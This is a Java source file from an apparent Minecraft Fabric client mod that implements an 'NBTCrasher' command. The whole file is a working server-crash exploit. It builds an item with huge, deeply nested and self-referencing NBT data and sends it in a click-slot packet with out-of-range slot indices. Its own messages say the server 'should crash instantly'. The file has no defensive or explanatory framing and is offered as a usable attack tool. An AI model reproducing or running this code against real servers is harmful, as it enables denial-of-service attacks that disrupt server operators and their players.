package net.paradise_client.command.impl;

import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;

public class NBTCrasher {
    private volatile boolean running = false;
    
    public NBTCrasher() {
        // Empty constructor
    }

    public void execute(String[] args) {
        if (args.length < 1) {
            showUsage();
            return;
        }

        if (args[0].equalsIgnoreCase("start")) {
            if (running) {
                sendMessage("§cNBTCrasher is already running!");
                return;
            }
            
            running = true;
            sendMessage("§aStarting NBTCrasher...");
            
            // Send crash packets on main thread
            sendCrashPackets();
            
        } else if (args[0].equalsIgnoreCase("stop")) {
            running = false;
            sendMessage("§cStopped NBTCrasher");
        } else {
            showUsage();
        }
    }

    private void sendCrashPackets() {
        if (!running || MinecraftClient.getInstance().getNetworkHandler() == null) return;

        try {
            // EXACT SAME CODE AS YOURS - translated to Fabric
            ItemStack crashItem = new ItemStack(Items.WRITABLE_BOOK, 64);
            NbtCompound nbt = new NbtCompound();
            NbtCompound display = new NbtCompound();
            NbtCompound nameCompound = new NbtCompound();

            for (int i = 0; i < 20; i++) {
                NbtCompound crashComponent = new NbtCompound();
                crashComponent.put("text", NbtString.of("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"));
                crashComponent.put("color", NbtString.of("dark_red"));
                crashComponent.put("bold", NbtString.of("true"));
                nameCompound.put("crash_" + i, crashComponent);
            }

            NbtCompound deepStructure = new NbtCompound();
            NbtCompound current = deepStructure;
            for (int i = 0; i < 10; i++) {
                NbtCompound next = new NbtCompound();
                next.put("text", NbtString.of("DEPTH_" + i + "_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"));
                current.put("nested", next);
                current = next;
                if (i == 5) {
                    current.put("circular", deepStructure.copy());
                }
            }
            nameCompound.put("deep", deepStructure);
            nameCompound.put("self", nameCompound.copy());

            display.put("Name", nameCompound);

            NbtCompound loreCompound = new NbtCompound();
            for (int i = 0; i < 10; i++) {
                NbtCompound loreLine = new NbtCompound();
                loreLine.put("text", NbtString.of("LORECRASH_" + i + "_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"));
                loreCompound.put("lore_" + i, loreLine);
            }
            display.put("Lore", loreCompound);

            nbt.put("display", display);
            nbt.put("self_ref", nbt.copy());

            crashItem.setNbt(nbt);

            Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
            for (int i = 0; i < 45; i++) {
                itemMap.put(i, crashItem);
            }
            itemMap.put(Integer.MAX_VALUE, crashItem);
            itemMap.put(Integer.MIN_VALUE, crashItem);

            //  - translated to Fabric
            ClickSlotC2SPacket packet = new ClickSlotC2SPacket(
                0,                      // containerId (was syncId)
                0,                      // revision  
                0,                      // slot
                0,                      // button
                SlotActionType.PICKUP,  // actionType (was ClickType.PICKUP)
                crashItem,              // stack
                itemMap                 // modifiedStacks
            );

            // EXACT SAME SEND - translated to Fabric
            MinecraftClient.getInstance().getNetworkHandler().sendPacket(packet);
            
            sendMessage("§4Sent NBT crash packet!");
            sendMessage("§cServer should crash instantly!");

        } catch (Exception e) {
            sendMessage("§cError: " + e.getMessage());
        } finally {
            running = false;
        }
    }

    public static void showUsage() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player != null) {
            client.player.sendMessage(Text.literal("§4=== NBT Crasher ==="));
            client.player.sendMessage(Text.literal("§a/nbtcrasher start §7- Send malicious NBT packet"));
            client.player.sendMessage(Text.literal("§c/nbtcrasher stop §7- Stop crasher"));
        }
    }

    public void onDisconnect() {
        running = false;
    }
    
    public boolean isRunning() {
        return running;
    }
    
    private void sendMessage(String message) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player != null) {
            client.player.sendMessage(Text.literal(message));
        }
    }
              }
